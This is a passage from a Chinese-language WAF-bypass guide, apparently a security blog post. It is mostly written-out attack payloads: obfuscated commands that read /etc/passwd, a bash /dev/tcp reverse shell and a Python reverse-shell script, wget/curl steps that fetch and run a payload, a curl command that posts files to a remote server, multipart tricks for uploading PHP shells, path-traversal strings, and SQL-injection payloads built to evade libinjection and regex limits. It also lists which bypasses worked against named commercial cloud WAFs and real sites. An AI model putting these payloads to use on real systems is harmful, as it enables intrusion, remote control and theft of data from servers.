class="code"><pre><span class="line">c'a't /e't'c/p'a's's''w'd</span><br><span class="line">c""at /e't'c/pass""wd</span><br><span class="line">c""at /e't'c/pas``s``wd</span><br></pre></td></tr></table></figure><p><strong>c. 反斜杠混淆</strong></p><blockquote><p>在传入payload的时候可能需要两个<code>\\</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/b\in/c\at /et\c/pas\swd</span><br></pre></td></tr></table></figure><p><strong>d. 变量混淆</strong></p><p>另外，也可以在shell命令的任意位置插入<code>$@</code>，或者在单词结尾处插入<code>$x</code>，这里的<code>x</code>可以是任意字母，例如可以写成如下形式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">c$</span><span class="bash">@at /e<span class="variable">$@tc</span>/pas<span class="variable">$@swd</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">x /etc<span class="variable">$x</span>/passwd<span class="variable">$x</span></span></span><br><span class="line"><span class="meta">ca$</span><span class="bash">@t /etc<span class="variable">$x</span>/passwd<span class="variable">$x</span></span></span><br></pre></td></tr></table></figure><p><strong>d. 编码绕过</strong></p><p>若通过编码绕过关键字，则可以将cat /etc/passwd进行base64编码，写法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh</span><br></pre></td></tr></table></figure><p><strong>e. 脚本混淆</strong></p><p>除此之外，还可以通过一些脚本执行引擎，如perl、python、nodejs、php、java等来绕过WAF关键字，相关写法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e '$a="ca";$b="t /et";$c="c/pas";exec($a.$b.$c."swd");'</span><br><span class="line">python -c 'import subprocess;subprocess.call(["ca"+"t","/et"+"c/pa"+"sswd"]);'</span><br><span class="line">php -r 'exec("ca"."t /et"."c/pa"."sswd");'</span><br></pre></td></tr></table></figure><h4 id="（3）获得shell"><a href="#（3）获得shell" class="headerlink" title="（3）获得shell"></a>（3）获得shell</h4><p>假如目标机器没有nc等可以简单实现反弹shell的环境，采用其他形式比如<code>bash -i</code>或者php、perl、python等语言来获得shell，又会因为字符过于复杂被拦截：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/1.1.1.1/1337 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>那么就可以先将脚本或者木马上传到目标机器上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;&lt;my ip address&gt;&quot;,2375));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure><p>然后执行脚本文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -v '.../?zzz=&lt;myip&gt;:2375/shell.py+-o+/tmp/shell.py'</span><br><span class="line"><span class="meta">#</span><span class="bash">或者使用wget</span></span><br><span class="line">.../?zzz=wg'e't 168431108 -P tmp</span><br><span class="line">.../?zzz=c'hm'od 777 -R tmp</span><br><span class="line">.../?zzz=/t'm'p/index.html</span><br></pre></td></tr></table></figure><h4 id="（4）转换函数绕过"><a href="#（4）转换函数绕过" class="headerlink" title="（4）转换函数绕过"></a>（4）转换函数绕过</h4><p>有两个小东西叫做<code>normalizePath</code>和<code>cmdLine</code>。在ModSecurity中，它们被称为“转换函数”，用于将用户输入的原始数据先转换，然后再匹配。如果WAF认为数据无害，才会发送原始数据到Web服务器。</p><p><code>normalizePath</code>：它会删除字符串中的多个斜杠、目录的自引用和目录的上级引用（除了最开始的输入）。</p><p><code>cmdLine</code>：由Marc Stern开发，会将所有的输入规范化，例如<code>/e&#39;t&#39;c/pa&#39;ss&#39;wd</code>会被转换规范为<code>/etc/passwd</code>。总之它可以做很多事：</p><ul><li>删除所有反斜杠</li><li>删除所有双引号</li><li>删除所有单引号</li><li>删除所有前插符</li><li>删除斜线前的空格</li><li>删除左括号前的空格</li><li>将所有逗号和分号替换为空格</li><li>将多个空格（包括制表符、换行符等）替换为一个空格</li><li>将所有字符转换为小写</li></ul><p>虽然黑名单文件拦截无法访问，但是源码文件一般还是ok的</p><p>比如curl可以利用POST的HTTP请求将文件发送到远程服务器，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -d @/&lt;file&gt; &lt;remote server&gt;</span><br><span class="line">curl ".../?zzz=-d+%40/usr/local/.../index.php+1.1.1.1:1337"</span><br></pre></td></tr></table></figure><h3 id="4-代码执行"><a href="#4-代码执行" class="headerlink" title="4. 代码执行"></a>4. 代码执行</h3><h4 id="（1）PHP"><a href="#（1）PHP" class="headerlink" title="（1）PHP"></a>（1）PHP</h4><p>利用PHP数组特性绕过WAF策略；在PHP中每个字符串都可以当作数组，这样基于字符串的正则匹配就很容易被绕过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$a=&quot;elmsty/ &quot;;($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp);&apos;</span><br></pre></td></tr></table></figure><blockquote><p>其他语言待补充</p></blockquote><h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p>以PHP Web Server对<code>multipart/form-data</code>的解析作为例子。</p><h4 id="（1）重复参数污染"><a href="#（1）重复参数污染" class="headerlink" title="（1）重复参数污染"></a>（1）重复参数污染</h4><p>由于该协议对PHP对解析存在缺陷，使得如果一行有多个filename字段值，则PHP Web Server会取最后一个filename值。</p><p><strong>多个字段</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.txt"; filename="a.php";</span><br></pre></td></tr></table></figure><p><strong>多个Content-Disposition</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.jpg";</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.php";</span><br></pre></td></tr></table></figure><p>PHP Web Server最终得到的文件名是<code>a.php</code>，而某些WAF只判断第一个filename的值，因此WAF对上传的文件的过滤检测功能会被黑客绕过，并且这里的<code>form-data</code>可有可无，将其去掉也不影响PHP Web Server获取<code>filename</code>。</p><p><strong>结合Charset编码</strong></p><p>此外，<code>filename</code>的编码还受HTTP请求<code>Content-Type</code>头中<code>charset</code>的影响，PHP Web Server可以根据这个值进行解码处理。这些都有可能被一些人稍微做点手脚，便可以绕过不少WAF的文件上传过滤检测功能。</p><h4 id="（2）换行绕过"><a href="#（2）换行绕过" class="headerlink" title="（2）换行绕过"></a>（2）换行绕过</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.jpg</span><br><span class="line"><span class="attribute">s/shell.php</span></span><br></pre></td></tr></table></figure><h4 id="（3）遗漏文件名"><a href="#（3）遗漏文件名" class="headerlink" title="（3）遗漏文件名"></a>（3）遗漏文件名</h4><p>当WAF遇到“name=”myfile”;;”时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;myfile&quot;;; filename=&quot;t3.jsp&quot;</span><br></pre></td></tr></table></figure><h4 id="（4）未解析所有文件"><a href="#（4）未解析所有文件" class="headerlink" title="（4）未解析所有文件"></a>（4）未解析所有文件</h4><p>multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p><h4 id="（5）文件名解析兼容性"><a href="#（5）文件名解析兼容性" class="headerlink" title="（5）文件名解析兼容性"></a>（5）文件名解析兼容性</h4><p>multipart协议中，文件名的形式为“filename=”abc.php””。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 ”filename=”abc.php”、”filename=abc.php”、 ”filename=’abc.php’”。而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。场景的绕过形式：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename=abc.php</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="abc.php</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename='abc.php’</span><br><span class="line">filename==="shell';.php</span><br></pre></td></tr></table></figure><h4 id="6-文件内容检测"><a href="#6-文件内容检测" class="headerlink" title="(6)文件内容检测"></a>(6)文件内容检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/php&quot;&gt;</span><br><span class="line">#Script Type PHP</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;??&gt;</span><br></pre></td></tr></table></figure><h3 id="6-路径限制"><a href="#6-路径限制" class="headerlink" title="6. 路径限制"></a>6. 路径限制</h3><p>文件操作相关的功能处</p><h4 id="（1）后台访问限制"><a href="#（1）后台访问限制" class="headerlink" title="（1）后台访问限制"></a>（1）后台访问限制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/myapp/admin.php?userid=1001</span><br><span class="line">/myapp/admin.php/xyz?userid=X#tomcat不支持</span><br><span class="line">/myapp/admin.php;random=value?userid=X#tomcat支持</span><br><span class="line">/myapp;param=value/admin.php?userid=X#tomcat支持</span><br></pre></td></tr></table></figure><h4 id="（2）针对路径匹配"><a href="#（2）针对路径匹配" class="headerlink" title="（2）针对路径匹配"></a>（2）针对路径匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/myapp//admin.php</span><br><span class="line">/myapp/./admin.php</span><br><span class="line">/myapp/xyz/../admin.php</span><br><span class="line">/myapp\admin.php</span><br><span class="line">/myapp/AdMiN.php</span><br></pre></td></tr></table></figure><h4 id="（3）相对路径绕过"><a href="#（3）相对路径绕过" class="headerlink" title="（3）相对路径绕过"></a>（3）相对路径绕过</h4><p>实现目录穿越</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../../../../../../要足够多</span><br></pre></td></tr></table></figure><p>如果../被替换为空，可以尝试双写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..././</span><br><span class="line">.....///</span><br></pre></td></tr></table></figure><p>如果../被拦截，还可以利用正则（要看中间件是否支持）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat .?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/etc/passwd</span><br><span class="line">cat /.$@./etc/passwd//在任何目录都可以读取</span><br></pre></td></tr></table></figure><p>有的开发者过滤检测的是../../ ../../../，emmmmmmm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..//..//..//..//..//..//..//..//..//..//..//..//..//..//   //针对../../过滤</span><br><span class="line">../..//../..//../..//../..//../..//../..//../..//../..//   //针对../../../过滤</span><br></pre></td></tr></table></figure><p>还可以尝试编码</p><blockquote><p>前提是服务器端能够识别此编码并解析</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..%5c/..%5c/..%5c/..%5c///url编码</span><br><span class="line">..%255c/..%255c/..%255c/..%255c///url二次编码</span><br><span class="line">unicode/UTF-8编码/其他编码</span><br></pre></td></tr></table></figure><p>也可以尝试下这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ..\/..\/etc/passwd</span><br></pre></td></tr></table></figure><p>如果是windows环境,还可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\..\</span><br></pre></td></tr></table></figure><p>Tomcat 路径跳转中允许<code>;</code>符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/..;/..;/</span><br><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><p>写WAF文件包含规则时，如果检测单一的”../”，误报会非常多，所以WAF文件包含规则通常会检测连续的“../“。根据vfs解析路径的语法，解析到“//”文件路径不变，解析到“/./”文件路径依然。 通过避免连续的”../“，从而绕过WAF文件包含规则。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">././..///./.././/../etc//passwd</span><br></pre></td></tr></table></figure><h4 id="（4）绝对路径绕过"><a href="#（4）绝对路径绕过" class="headerlink" title="（4）绝对路径绕过"></a>（4）绝对路径绕过</h4><p>WAF没有考虑到路径中插入“/./”、“//”对于vfs解析路径是等价的，导致可被绕过。例如 /etc/./passwd 与 /etc/passwd 是等价的。还可以通过组合“/./”、“//”进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc///.//././/passwd</span><br><span class="line">/wtt/../etc/passwd</span><br></pre></td></tr></table></figure><p>利用WAF未检测的协议。PHP 文件包含支持的协议，在渗透测试中，看环境选择可行的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// — Accessing local filesystem</span><br><span class="line">http:// — Accessing HTTP(s) URLs</span><br><span class="line">ftp:// — Accessing FTP(s) URLs</span><br><span class="line">php:// — Accessing various I/O streams</span><br><span class="line">zlib:// — Compression Streams data:// — Data (RFC 2397)</span><br><span class="line">glob:// — Find pathnames matching pattern</span><br><span class="line">phar:// — PHP Archive</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — Audio streams</span><br><span class="line">expect:// — Process Interaction Streams</span><br></pre></td></tr></table></figure><h3 id="7-XSS"><a href="#7-XSS" class="headerlink" title="7. XSS"></a>7. XSS</h3><p>待补充</p><h3 id="8-第三方组件"><a href="#8-第三方组件" class="headerlink" title="8. 第三方组件"></a>8. 第三方组件</h3><p>一般来说，WAF会用到的第三方组件有PCRE、ISAPI、Libinjection等。</p><h4 id="（1）PCRE"><a href="#（1）PCRE" class="headerlink" title="（1）PCRE"></a>（1）PCRE</h4><p>PCRE在处理正则表达式时，为了防止ReDoS正则表达式拒绝服务攻击，提供了<code>PCRE_EXTRA_MATCH_LIMIT</code>和<code>PCRE_EXTRA_MATCH_LIMIT_RECURSION</code>选项来限制匹配次数。</p><ul><li><p><code>PCRE_EXTRA_MATCH_LIMIT</code>的值默认为100万，可以限制匹配的总次数；</p></li><li><p><code>PCRE_EXTRA_MATCH_LIMIT_RECURSION</code>主要限制匹配递归次数，并不是所有匹配都存在递归，所以该值在小于<code>PCRE_EXTRA_MATCH_LIMIT</code>值时才有意义。</p></li></ul><p>有些WAF为了防止ReDoS都会将<code>PCRE_EXTRA_MATCH_LIMIT</code>设置为比默认值更小的值，加入将WAF过滤SQL语句的正则表达式写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/UNION.+?SELECT/is</span><br></pre></td></tr></table></figure><p>而此时<code>PCRE_EXTRA_MATCH_LIMIT</code>的值为100万，那么要绕过WAF过滤防护的SQL语句可以写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*aaa……a*/select</span><br></pre></td></tr></table></figure><p>这里被注释掉的字符<code>a</code>有100万个，很容易满足<code>PCRE_EXTRA_MATCH_LIMIT</code>的值为100万的限制条件，而且这些字符的数据量大小不到1MB，不会占用太多空间。根据此方法可以绕过很多类似的WAF正则规则。</p><h4 id="（2）ISAPI"><a href="#（2）ISAPI" class="headerlink" title="（2）ISAPI"></a>（2）ISAPI</h4><p>ISAPI是IIS提供的一套编写API的插件，<code>ISAPI filter</code>可以对请求头中的数据进行过滤，<code>ISAPI extension</code>可以获取请求的body数据，对应的原型为<code>HttpExtensionProc(EXTENSION_CONTROL_BLOCK*pECB)</code>。这里可以通过<code>pECB-&gt;lpbData</code>获取到post请求的body部分的数据，但最大只能存储48kb的数据。总的大小可以通过<code>pECB-&gt;cbTotalBytes</code>获取，超过48kb的数据的同步函数调用方式可以通过<code>pECB-&gt;ReadClient(...)</code>获取，异步函数调用方式可以通过<code>pECB-&gt;ServerSupportFunction(...,HSE_REQ_ASYNC_READ_CLIENT,...)</code>获取。</p><p>但是，这样在ISAPI插件的WAF中读取超过48kb的数据会导致后面的ASP获取不了多于48kb的数据，因此很多基于ISAPI的IIS WAF都可以通过把攻击数据放到48kb外而绕过WAF防护。如果某post参数id存在SQL注入，那么我们可以填充48kb的无用数据后再写注入语句，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=aaa...a&amp;id=1%20union%20all%20select%201,1,1,1@@version,1</span><br></pre></td></tr></table></figure><p>其中，上面的a字符所占用的空间超过了48kb</p><h4 id="（3）Libinjection"><a href="#（3）Libinjection" class="headerlink" title="（3）Libinjection"></a>（3）Libinjection</h4><p>Libinjection被应用于很多WAF中，知名的有modsecurity。因为Libinjection只是对SQL语句进行标签化（token化），然后对被标签化的字符串进行匹配，所以同一种绕过方法通常可以绕过很多SQL注入语句的过滤规则。</p><p>利用不常用的SQL函数可以绕过Libinjection过滤，比如用mod(3,2)代替1的SQL语句可以写为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod(3,2) union select mod(3,2),usr,pwd from user --</span><br></pre></td></tr></table></figure><p>通过使用Fuzz测试技术也可以绕过Libinjection过滤，例如插入<code>1&lt;@</code>到SQL语句中可以绕过Libinjection防护，此方法也可以绕过某些WAF的SQL注入语义检测引擎。相关的Python脚本地址为：<a href="https://waf.ninja/libinjection-fuzz-to-bypass/" target="_blank" rel="noopener">https://waf.ninja/libinjection-fuzz-to-bypass/</a></p><p>通过大括号也可以绕过Libinjection过滤，MySQL支持<code>{identifier expr}</code>这种兼容ODBC的转义写法，对应的可绕过Libinjection过滤的SQL语句如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;&lt;@=1 or &#123;x (select 1)&#125; --</span><br><span class="line">1 and&#123;`if`updatexml (1,concat (0x3a,(select /*!50000(/*!50000schema_name) from/*!50000information_schema*/.schemata limit 0,1)),1)&#125; --</span><br></pre></td></tr></table></figure><h2 id="八、Google-Dorks-Approach"><a href="#八、Google-Dorks-Approach" class="headerlink" title="八、Google Dorks Approach"></a>八、Google Dorks Approach</h2><p>应对已知WAF的绕过，然后如果都不能用的情况下，可以参考历史payload的一些核心绕过思想稍加修改或补充，可以很大概率继续绕过。</p><p><strong>搜索语法</strong></p><ul><li>Normal search:<br><code>+ waf bypass</code></li><li>Searching for specific version exploits:<br><code>&quot; &quot; (bypass|exploit)</code></li><li>For specific type bypass exploits:<br><code>&quot;&quot; + (bypass|exploit)</code></li><li>On <a href="https://exploit-db.com/" target="_blank" rel="noopener">Exploit DB</a>:<br><code>site:exploit-db.com + bypass</code></li><li>On <a href="https://0day.today/" target="_blank" rel="noopener">0Day Inject0r DB</a>:<br><code>site:0day.today +  (bypass|exploit)</code></li><li>On <a href="https://twitter.com/" target="_blank" rel="noopener">Twitter</a>:<br><code>site:twitter.com + bypass</code></li><li>On <a href="https://pastebin.com/" target="_blank" rel="noopener">Pastebin</a><br><code>site:pastebin.com + bypass</code></li></ul><h1 id="0x05-CASE"><a href="#0x05-CASE" class="headerlink" title="0x05 CASE"></a>0x05 CASE</h1><blockquote><p>因测试各厂商的WAF产品的站点数量较少，测试结果可能会存在少许误差</p></blockquote><h2 id="零、使用说明"><a href="#零、使用说明" class="headerlink" title="零、使用说明"></a>零、使用说明</h2><ol><li><p>过WAF的方法或payload本身就具有时效性，过于滥用会加速这些姿势的消失；</p></li><li><p>最低优先级使用规则方式绕WAF，某些情况下，用一次少一个。</p></li></ol><h2 id="一、云WAF"><a href="#一、云WAF" class="headerlink" title="一、云WAF"></a>一、云WAF</h2><h3 id="1-阿里云"><a href="#1-阿里云" class="headerlink" title="1. 阿里云"></a>1. 阿里云</h3><p><strong>测试站点：</strong></p><ul><li><p>edu.aliyun.com</p></li><li><p>yq.aliyun.com</p></li></ul><p><strong>测试结果：</strong></p><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>畸形分块（Apache）</li><li>分块欺骗（Tomcat）</li><li>Content-Type编码+分块编码（大学站点测试ok）</li><li>报错绕过（Apache）</li><li>资源限制</li></ol><h3 id="2-腾讯云"><a href="#2-腾讯云" class="headerlink" title="2. 腾讯云"></a>2. 腾讯云</h3><p><strong>测试站点：</strong></p><ul><li><p>cloud.tencent.com</p></li><li><p>guanjia.qq.com</p></li></ul><p><strong>测试结果：</strong></p><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>正常分块（guanjia）</li><li>畸形分块（Apache、Nginx）</li><li>分块欺骗（Tomcat）</li><li>Content-Type编码+分块编码（guanjia）</li><li>报错绕过（Apache）</li><li>静态资源白名单（guanjia）</li></ol><h3 id="3-百度云-Cloudflare"><a href="#3-百度云-Cloudflare" class="headerlink" title="3. 百度云/Cloudflare"></a>3. 百度云/Cloudflare</h3><p><strong>测试站点：</strong></p><ul><li>su.baidu.com（支持pipeline回显）</li><li><a href="http://www.8868.cn" target="_blank" rel="noopener">www.8868.cn</a></li><li><a href="http://www.cloudflare.com" target="_blank" rel="noopener">www.cloudflare.com</a></li></ul><p><strong>测试结果：</strong></p><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>畸形分块（Apache）</li><li>分块欺骗（Tomcat）</li><li>Content-Type编码（cloudflare）</li><li>Content-Type编码+分块编码（cloudflare）</li><li>报错绕过（Apache）</li><li>参数溢出（目前仅检测前100个参数）</li><li>资源限制</li></ol><h3 id="4-创宇盾"><a href="#4-创宇盾" class="headerlink" title="4. 创宇盾"></a>4. 创宇盾</h3><p><strong>测试站点：</strong></p><ul><li><p>yunaq.com</p></li><li><p>ichunqiu.com</p></li></ul><p><strong>测试结果：</strong></p><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>畸形分块（Apache）</li><li>分块欺骗（Tomcat）</li><li>报错绕过（Apache）</li><li>静态资源白名单</li></ol><h3 id="5-京东云"><a href="#5-京东云" class="headerlink" title="5. 京东云"></a>5. 京东云</h3><p><strong>测试站点：</strong></p><ul><li>jdcloud.com</li></ul><p><strong>测试结果：</strong></p><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>正常分块</li><li>畸形分块（Apache、Nginx）</li><li>分块欺骗（Tomcat）</li><li>Content-Type编码</li><li>Content-Type编码+分块编码</li><li>报错绕过（Apache）</li><li>资源限制</li><li>静态资源白名单</li></ol><h3 id="6-奇安信"><a href="#6-奇安信" class="headerlink" title="6. 奇安信"></a>6. 奇安信</h3><ol><li>CDN绕过</li><li>Pipelining（无回显）</li><li>畸形分块（Apache）</li><li>分块欺骗（Tomcat）</li><li>报错绕过（Apache）</li><li>资源限制</li></ol><h2 id="二、软WAF"><a href="#二、软WAF" class="headerlink" title="二、软WAF"></a>二、软WAF</h2><h3 id="1-宝塔-Nginx版"><a href="#1-宝塔-Nginx版" class="headerlink" title="1. 宝塔(Nginx版)"></a>1. 宝塔(Nginx版)</h3><ul><li>参数溢出（目前仅检测前870个参数）</li></ul><h3 id="2-宝塔-Apache版"><a href="#2-宝塔-Apache版" class="headerlink" title="2. 宝塔(Apache版)"></a>2. 宝塔(Apache版)</h3><p>待测试</p><h3 id="3-安全狗"><a href="#3-安全狗" class="headerlink" title="3. 安全狗"></a>3. 安全狗</h3><p>待测试</p><h3 id="4-云锁"><a href="#4-云锁" class="headerlink" title="4. 云锁"></a>4. 云锁</h3><p>待测试</p><h3 id="5-雷池"><a href="#5-雷池" class="headerlink" title="5. 雷池"></a>5. 雷池</h3><p>待测试</p><h3 id="6-Modsecurity"><a href="#6-Modsecurity" class="headerlink" title="6. Modsecurity"></a>6. Modsecurity</h3><p>听说报错不检测，在某些中间件环境下，可以借助各种畸形协议，真实性有待测试。</p><h2 id="三、硬件WAF"><a href="#三、硬件WAF" class="headerlink" title="三、硬件WAF"></a>三、硬件WAF</h2><blockquote><p>测试目标太少，后续遇到时再做补充</p></blockquote><p>与云WAF类似，只是没法通过绕过CDN实现无脑通关</p><h3 id="1-深信服"><a href="#1-深信服" class="headerlink" title="1. 深信服"></a>1. 深信服</h3><p>待测试</p><h3 id="2-奇安信"><a href="#2-奇安信" class="headerlink" title="2. 奇安信"></a>2. 奇安信</h3><p>待测试</p><h3 id="3-天融信"><a href="#3-天融信" class="headerlink" title="3. 天融信"></a>3. 天融信</h3><p>待测试</p><h3 id="4-绿盟"><a href="#4-绿盟" class="headerlink" title="4. 绿盟"></a>4. 绿盟</h3><p>待测试</p><h3 id="5-安恒信息"><a href="#5-安恒信息" class="headerlink" title="5. 安恒信息"></a>5. 安恒信息</h3><p>待测试</p><h3 id="6-启明星辰"><a href="#6-启明星辰" class="headerlink" title="6. 启明星辰"></a>6. 启明星辰</h3><p>待测试</p><h1 id="0x06-WAF为什么可以绕过"><a href="#0x06-WAF为什么可以绕过" class="headerlink" title="0x06 WAF为什么可以绕过"></a>0x06 WAF为什么可以绕过</h1><ul><li>安全、效率、成本之间的平衡，不是规则不够强，只是相对于业务和效率做出了让步</li><li>甲方使用默认配置，不会根据业务特点做专门的防护</li></ul><p>互联网公司中，效率代表产品的易用性和响应时间，往往很难有较大牺牲，成本和安全的组合形式决定了安全产品架构的不同，即便在倾向选择中安全成为首位，WAF产品本身也有痼疾：HTTP协议和业务场景的复杂性导致很难有统一的策略规范，加之WAF抽离于业务代码逻辑以外，这些耦合上的瑕疵很容易成为绕过WAF防护的突破口。</p><p>再者，不管是基于正则匹配还是机器学习，考量WAF的指标永远是相互矛盾的：误报率，漏报率。在安全和效率(业务)的博弈中，没有完美，只有适配，这也就决定了WAF的定位。</p><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>最好先熟悉各种WAF的产品形态，部署方式，以及对应的一些绕过特点（比如：嵌入式WAF不用考虑协议层绕过，云WAF才有CDN绕过）。</p><p>基本上每个人多少都会知道一些过WAF的思路，同时也有很多人分享过各种思路，这是基本功，但还不够。</p><p>有了基本功还需要实际去实际测试和验证这些思路，要清楚每种思路的环境条件限制和对哪些WAF有效，这样在遇到WAF时，结合目标服务器环境和WAF厂商，可以快速定位当前哪些方法是可用的，或者哪些方法曾经可用且自己未储备新的姿势时，稍加变通（在之前payload基础上加以修改/混淆）即可快速通过。</p><p>另外，如果想更深入和挖掘更多的绕过WAF姿势，还需要多研究协议相关标准文档和解析源码（协议、中间件、T-SQL语法等）。</p><h1 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 